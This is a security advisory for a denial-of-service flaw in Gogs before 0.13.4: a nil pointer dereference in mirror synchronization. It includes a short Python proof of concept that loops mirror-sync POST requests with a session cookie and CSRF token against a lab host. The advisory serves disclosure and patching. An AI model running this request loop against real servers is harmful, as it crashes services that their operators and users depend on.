# [M] Gogs has a Denial of Service issue

## Summary
Severity: Medium
Advisory: GHSA-cr88-6mqm-4g57
CVE: CVE-2026-22592
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-02-06
Source: https://github.com/advisories/GHSA-cr88-6mqm-4g57
Type: github-advisory

## Affected
- Go: `gogs.io/gogs` — affected >=0 <0.13.4

## Details
### Summary
An authenticated user can cause a DOS attack. If one of the repo files is deleted before synchronization, it will cause the application to crash.

### Details
If GetMirrorByRepoID fails, the error log dereferencing null pointer. This happens if the repository no longer exits.
https://github.com/gogs/gogs/blob/4cc83c498b6ae59356a04912d68a932165bad5e6/internal/database/mirror.go#L333-L337
if `err != nil` `m` is alwasa `nil`
https://github.com/gogs/gogs/blob/4cc83c498b6ae59356a04912d68a932165bad5e6/internal/database/mirror.go#L269-L278
### PoC
Spam mirror-sync on repo and delete this repo
code python spam mirror-sync
```py
import requests

url = "http://gogs.lan:3000/superuser/gobypass403/settings"
headers = {
    "Cookie": "lang=en-US; i_like_gogs=fe32281ab84ae868; _csrf=UCw6xvqR-L7YLBMPjujwjywxy8s6MTc2NDc3NDQ2NDE1MzU5ODQ3Mg",
}

data = {
    "_csrf": "UCw6xvqR-L7YLBMPjujwjywxy8s6MTc2NDc3NDQ2NDE1MzU5ODQ3Mg",
    "action": "mirror-sync",
}

while True:
    print("syncing")
    response = requests.post(url, headers=headers, data=data)
```
### Impact
Denial of Service server crash.

## References
- https://github.com/gogs/gogs/security/advisories/GHSA-cr88-6mqm-4g57
- https://nvd.nist.gov/vuln/detail/CVE-2026-22592
- https://github.com/gogs/gogs/commit/961a79e8f9f2b3190ea804bcf635e4b43b123272
- https://github.com/gogs/gogs
- https://github.com/gogs/gogs/blob/4cc83c498b6ae59356a04912d68a932165bad5e6/internal/database/mirror.go#L269-L278
- https://github.com/gogs/gogs/blob/4cc83c498b6ae59356a04912d68a932165bad5e6/internal/database/mirror.go#L333-L337
